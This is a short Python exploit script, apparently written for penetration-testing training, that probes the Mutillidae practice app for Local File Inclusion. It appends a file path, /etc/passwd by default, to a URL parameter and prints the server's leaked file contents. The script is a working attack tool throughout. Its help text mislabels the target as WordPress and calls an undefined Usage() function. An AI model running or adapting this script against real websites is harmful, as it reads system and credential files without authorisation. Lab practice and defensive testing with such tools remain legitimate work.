#!/usr/bin/python
#===============================================================
#  Broken Access Control Vulnerability Penetration Testing Exploit
#  Local File Inclusion (LFI) Scanner for Mutillidae
#  Author: Kailas PATIL
#  Email: patilkr80 [AT] gmail [DOT] com
#===============================================================

import sys, getopt
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
import re
from bs4 import BeautifulSoup
import datetime

#def visible(element):
#	if element.parent.name in ['style', 'script', '[document]', 'head', 'title']:
#		return False
#	elif re.match('<!-- .* -->', str(element.encode('utf-8'))):
#		return False
#	return True


def main(argv):
	if len(sys.argv) < 2:
		print ('The required option is: --url or -u')
		print ('Please use -h for the list of available options.')
		sys.exit(1)
	websiteurl = ''
	fileName =  '/etc/passwd'
	payload = ''
	try:
		opts, args = getopt.getopt(sys.argv[1:],"hf:u:",["url="])
		for opt, arg in opts:
			if opt == '-h':
				print ('_______________________________________________________________')
				print (' Broken Access Control Penetration Testing Exploit ')
				print (' Local File Inclusion (LFI) Vulnerability Scanner for Mutillidae')
				print ('_______________________________________________________________')
				print (' Author: Kailas PATIL')
				print (' Email: patilkr80 [AT] gmail [DOT] com')
				print ('_______________________________________________________________')
				print (' Usage: python3 mutillidae_LFI.py [options]')
				print ('  -h 			Display the simple help and exit')
				print ('  --url <URL>		The URL of the WordPress website to scan	')
				print ('  -u <URL>		The URL of the WordPress website to scan	')
				print ('  -f <fileName>  	The name of a file to load. ')
				print ('			Default value:/etc/passwd')
				print ('_______________________________________________________________')
				print (' Usage Examples:')
				print ('	python3 mutillidae_LFI.py -f /etc/hosts  -u http://example.com/index.php?page=')
				print ('	python3 mutillidae_LFI.py --url http://example.com/index.php?page=')
				print ('_______________________________________________________________')
				sys.exit()
			elif opt == '-f':
				fileName = arg
				#print ('filename = ', fileName)
			elif opt in ("-u", "--url"):
				websiteurl = arg
				print ('===============================================================')
				print (' Broken Access Control Penetration testing Exploit')
				print (' Local File Inclusion (LFI) Scanner for Mutillidae')
				print (' Author: Kailas PATIL')
				print (' Email: patilkr80 [AT] gmail [DOT] com')
				print ('_______________________________________________________________')
				print (' WebsiteURL Provided by the User to Scan:  ', websiteurl)
				payload = websiteurl + fileName
				print (' LFI Payload URL is: ', payload)
				now = datetime.datetime.now()
				print (" Scan date and time : " + now.strftime("%Y-%m-%d %H:%M:%S"))
				print ('===============================================================')
				req = Request(payload)
				try:
					html = urlopen(req)
					the_page = html.read()
					#print(the_page)
					soup = BeautifulSoup(the_page, 'html.parser')
					blockquote = soup.find('blockquote')
					print (blockquote)
				except HTTPError as e:
					print(' HTTP Error Code is: ', e.code)
					print(' Error !!! HTTP Error. Unsucessful to exploit the given web URL.')
				except URLError as e:
					print (' Error!!! URL Error.  Unsuccessful to exploit the given website.')
					print('URLError: {}'.format(e.reason))
				print ('_____________________________________________________')

	except getopt.GetoptError:
		print ('mutillidae_LFI.py -f <fileName> -u <URL>')
		Usage()
		print ('_____________________________________________________')
		sys.exit(2)

if __name__ == "__main__":
	main(sys.argv[1:])

